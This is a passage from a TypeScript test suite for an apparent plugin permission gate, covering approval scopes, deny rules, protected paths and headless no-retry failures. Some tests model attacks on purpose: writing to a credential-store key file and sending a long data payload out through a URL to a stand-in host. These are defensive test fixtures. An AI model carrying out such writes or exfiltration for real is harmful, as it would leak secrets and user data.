        await expect(api.storage.write("a.txt")).rejects.toThrow("Nobody can approve this request; do not retry.");
      });
      expect(review).toHaveBeenCalledOnce();
      expect(requests).toHaveLength(0);
      expect(log).toEqual([]);
    });
  }

  it("allow mode permits a headless ordinary effect through common policy", async () => {
    permissionManager.setMode("allow");
    const { gate, requests } = makeGate("deny-once");
    const log: string[] = [];
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: true, toolName: "outer" }, () => api.storage.write("a.txt"));
    expect(log).toEqual(["write"]);
    expect(requests).toHaveLength(0);
  });

  it("an explicit deny beats allow mode and the reviewer", async () => {
    permissionManager.setMode("allow");
    permissionManager.setRules([{ pattern: "effect_storage_write", source: "plugin", action: "deny" }]);
    const review = vi.spyOn(permissionManager, "dispatchReviewer");
    const { gate, requests } = makeGate("allow-once");
    const log: string[] = [];
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await expect(api.storage.write("a.txt")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(review).not.toHaveBeenCalled();
    expect(requests).toHaveLength(0);
    expect(log).toEqual([]);
  });

  it("a mandatory floor stays fresh and cannot become remembered", async () => {
    permissionManager.setMode("allow");
    const review = vi.spyOn(permissionManager, "dispatchReviewer");
    const { gate, requests } = makeGate("allow-always");
    const log: string[] = [];
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer", permissionContext: { floor: { code: "other-principal", reason: "A different principal owns this surface." } } }, async () => {
      await api.storage.write("a.txt");
      await api.storage.write("a.txt");
    });
    expect(requests).toHaveLength(2);
    expect(requests.every((value) => value.forceExplicit)).toBe(true);
    expect(review).not.toHaveBeenCalled();
  });

  it("rechecks live policy before reusing an invocation grant", async () => {
    const { gate, requests } = makeGate("allow-once");
    const log: string[] = [];
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await api.storage.write("a.txt");
      permissionManager.setRules([{ pattern: "effect_storage_write", source: "plugin", action: "deny" }]);
      await expect(api.storage.write("a.txt")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(requests).toHaveLength(1);
    expect(log).toEqual(["write"]);
  });

  it("an explicit ask still overrides a remembered exact descriptor", async () => {
    const { gate, requests } = makeGate("allow-always");
    const log: string[] = [];
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, () => api.storage.write("a.txt"));
    permissionManager.setRules([{ pattern: "effect_storage_write", source: "plugin", action: "ask" }]);
    await runWithEffectGateContext({ headless: true, toolName: "outer" }, async () => {
      await expect(api.storage.write("a.txt")).rejects.toThrow("Nobody can approve this request; do not retry.");
    });
    expect(requests).toHaveLength(1);
    expect(log).toEqual(["write"]);
  });

  it("an active tool effect without policy dependencies fails clearly", async () => {
    const { gate } = makeGate("allow-once");
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await expect(gateMutatingEffect({ pluginId: "p1", methodPath: "storage.write", effect: "write", target: "a.txt", approvalGate: gate })).rejects.toThrow("Effect enforcement requires a permission manager");
    });
  });
});

describe("exact effect authority and sealed execution", () => {
  it("different worker args and environment cannot share an approval", async () => {
    const { gate, requests } = makeGate("allow-always");
    const log: string[] = [];
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    const base = { workerId: "worker", command: "/bin/echo", args: ["first"], env: { TASK: "first" } };
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await api.spawnWorker(base);
      await api.spawnWorker({ ...base, args: ["second"] });
      await api.spawnWorker({ ...base, env: { TASK: "second" } });
    });
    expect(requests).toHaveLength(3);
    expect(new Set(requests.map((value) => value.approvalScope)).size).toBe(3);
  });

  it("mutating caller arguments during the card cannot change the executed worker", async () => {
    let answer!: (decision: ApprovalDecision) => void;
    const gate = { requestAndWait: vi.fn((request: ApprovalRequest) => new Promise<ApprovalDecision>((resolve) => {
      answer = (decision) => resolve({ ...decision, requestId: request.id });
    })) } as unknown as ApprovalGate;
    const executed: unknown[] = [];
    const api = enforceMutatingEffects({ spawnWorker: async (spec: unknown) => { executed.push(spec); } }, deps(gate));
    const spec = { workerId: "worker", command: "/bin/echo", args: ["approved"], env: { TASK: "approved" } };
    const pending = runWithEffectGateContext({ headless: false, toolName: "outer" }, () => api.spawnWorker(spec));
    await vi.waitFor(() => expect(answer).toBeTypeOf("function"));
    spec.args[0] = "changed";
    spec.env.TASK = "changed";
    answer({ requestId: "ignored", choice: "allow-once" });
    await pending;
    expect(executed).toEqual([{ workerId: "worker", command: "/bin/echo", args: ["approved"], env: { TASK: "approved" } }]);
  });

  it("different write contents cannot reuse a prior exact-path approval", async () => {
    const { gate, requests } = makeGate("allow-always");
    const api = enforceMutatingEffects(makeApi([]), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await api.storage.write("a.txt", "first");
      await api.storage.write("a.txt", "second");
    });
    expect(requests).toHaveLength(2);
  });

  it("protected storage targets keep their mandatory floor in allow mode", async () => {
    permissionManager.setMode("allow");
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi([]), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, () => api.storage.write(".git/config", "value"));
    expect(requests).toHaveLength(1);
    expect(requests[0].forceExplicit).toBe(true);
    expect(requests[0].allowedChoices).toEqual(["allow-once", "deny-once"]);
  });

  it("storage reads still evaluate protected paths before ordinary-read allowance", async () => {
    permissionManager.setMode("allow");
    const { gate, requests } = makeGate("deny-once");
    const api = enforceMutatingEffects(makeApi([]), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await expect(api.storage.read(".git/config")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(requests).toHaveLength(1);
    expect(requests[0].forceExplicit).toBe(true);
  });

  for (const method of ["GET", "HEAD", "OPTIONS"] as const) {
    it(`${method} is an independent network permission even though its recorded effect is read`, async () => {
      const { gate, requests } = makeGate("deny-once");
      const check = vi.spyOn(permissionManager, "checkDetailed");
      await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
        await expect(gateMutatingEffect({ pluginId: "p1", methodPath: "hostFetch", effect: "read", target: "https://service.example", input: ["https://service.example/resource", { method }], approvalGate: gate, permissionManager })).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
      });
      expect(check).toHaveBeenCalledWith("effect_hostFetch", "plugin", "network", undefined, expect.objectContaining({ ruleSubject: { kind: "webfetch", url: "https://service.example/resource" } }));
      expect(requests).toHaveLength(1);
    });
  }

  it("network URL, method and body are all part of exact grant identity", async () => {
    const { gate, requests } = makeGate("allow-always");
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      for (const [url, method, body] of [["https://service.example/a", "POST", "first"], ["https://service.example/b", "POST", "first"], ["https://service.example/a", "DELETE", "first"], ["https://service.example/a", "POST", "second"]]) {
        await gateMutatingEffect({ pluginId: "p1", methodPath: "hostFetch", effect: "write", target: "https://service.example", input: [url, { method, body }], approvalGate: gate, permissionManager });
      }
    });
    expect(requests).toHaveLength(4);
    expect(new Set(requests.map((value) => value.approvalScope)).size).toBe(4);
  });

  it("owner-away effect cards carry their unlimited-wait policy marker", async () => {
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi([]), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer", permissionContext: { ownerUnattended: true } }, () => api.callLlm("hello"));
    expect(requests[0].ownerUnattended).toBe(true);
  });

  it("session grants cannot authorize an identical effect in a different conversation", async () => {
    const { gate, requests } = makeGate("allow-session");
    const api = enforceMutatingEffects(makeApi([]), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer", sessionId: "first" }, () => api.storage.write("a.txt", "same"));
    await runWithEffectGateContext({ headless: false, toolName: "outer", sessionId: "second" }, () => api.storage.write("a.txt", "same"));
    expect(requests).toHaveLength(2);
  });
});

describe("materialized data and admission evidence", () => {
  it("typed identities distinguish class values from similarly shaped plain data", () => {
    const date = new Date("2026-01-01T00:00:00.000Z");
    expect(snapshotEffectArguments([date]).identity).not.toEqual(snapshotEffectArguments([{ date: date.toISOString() }]).identity);
    expect(snapshotEffectArguments([undefined]).identity).not.toEqual(snapshotEffectArguments([null]).identity);
  });

  it("shared byte storage cannot change the copied payload", () => {
    const original = new Uint8Array(new SharedArrayBuffer(2));
    original.set([1, 2]);
    const snapshot = snapshotEffectArguments([original]);
    original.set([3, 4]);
    expect(Array.from(snapshot.args[0] as Uint8Array)).toEqual([1, 2]);
  });

  it("different serialized date and record values cannot share a JSON write grant", async () => {
    const { gate, requests } = makeGate("allow-always");
    const written: string[] = [];
    const api = enforceMutatingEffects({ storage: { writeJson: async (_path: string, value: unknown) => { written.push(JSON.stringify(value)); } } }, deps(gate));
    const date = new Date("2026-01-01T00:00:00.000Z");
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await api.storage.writeJson("data.json", date);
      await api.storage.writeJson("data.json", { date: date.toISOString() });
    });
    expect(written).toEqual(['"2026-01-01T00:00:00.000Z"', '{"date":"2026-01-01T00:00:00.000Z"}']);
    expect(requests).toHaveLength(2);
    expect(requests[0].approvalScope).not.toBe(requests[1].approvalScope);
  });

  it("a JSON serializer cannot change the bytes while the card waits", async () => {
    let answer!: (decision: ApprovalDecision) => void;
    const gate = { requestAndWait: vi.fn((request: ApprovalRequest) => new Promise<ApprovalDecision>((resolve) => {
      answer = (decision) => resolve({ ...decision, requestId: request.id });
    })) } as unknown as ApprovalGate;
    const written: string[] = [];
    const api = enforceMutatingEffects({ storage: { writeJson: async (_path: string, value: unknown) => { written.push(JSON.stringify(value)); } } }, deps(gate));
    let value = "approved";
    const pending = runWithEffectGateContext({ headless: false, toolName: "outer" }, () => api.storage.writeJson("data.json", { toJSON: () => ({ value }) }));
    await vi.waitFor(() => expect(answer).toBeTypeOf("function"));
    value = "changed";
    answer({ requestId: "ignored", choice: "allow-once" });
    await pending;
    expect(written).toEqual(['{"value":"approved"}']);
  });

  it("a credential-store path cannot pass admission in allow mode", async () => {
    permissionManager.setMode("allow");
    const { gate, requests } = makeGate("allow-once");
    const api = enforceMutatingEffects(makeApi([]), { ...deps(gate), resolveStoragePath: () => join(tmpdir(), ".ave", "secrets", "master.key") });
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await expect(api.storage.write("ignored", "payload")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(requests).toHaveLength(0);
  });

  it("full URL exfiltration evidence forces a once-only card in allow mode", async () => {
    permissionManager.setMode("allow");
    const { gate, requests } = makeGate("deny-once");
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await expect(gateMutatingEffect({ pluginId: "p1", methodPath: "hostFetch", effect: "read", target: "https://service.example", input: [`https://service.example/?payload=${"a".repeat(600)}`, { method: "GET" }], approvalGate: gate, permissionManager })).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(requests).toHaveLength(1);
    expect(requests[0].forceExplicit).toBe(true);
    expect(requests[0].allowedChoices).toEqual(["allow-once", "deny-once"]);
  });
});

describe("configuration control effects", () => {
  it("configuration writes cannot use a namespace-only bypass in allow mode", async () => {
    permissionManager.setMode("allow");
    const { gate, requests } = makeGate("deny-once");
    const write = vi.fn(async (_key: string, _value: unknown) => {});
    const api = enforceMutatingEffects({ config: { set: write } }, deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer" }, async () => {
      await expect(api.config.set("setting", "value")).rejects.toBeInstanceOf(EffectBoundaryDeniedError);
    });
    expect(requests).toHaveLength(1);
    expect(requests[0].forceExplicit).toBe(true);
    expect(write).not.toHaveBeenCalled();
  });
});

describe("human fallback termination", () => {
  it("preserves the no-retry result when the approval surface disappears or owner-away skips", async () => {
    const gate = { requestAndWait: vi.fn(async (request: ApprovalRequest) => ({ requestId: request.id, choice: "deny-once", rememberPattern: "Nobody can approve this request; do not retry." })) } as unknown as ApprovalGate;
    const log: string[] = [];
    const api = enforceMutatingEffects(makeApi(log), deps(gate));
    await runWithEffectGateContext({ headless: false, toolName: "outer", permissionContext: { ownerUnattended: true } }, async () => {
      await expect(api.callLlm("hello")).rejects.toThrow("Nobody can approve this request; do not retry.");
    });
    expect(log).toEqual([]);
  });
});
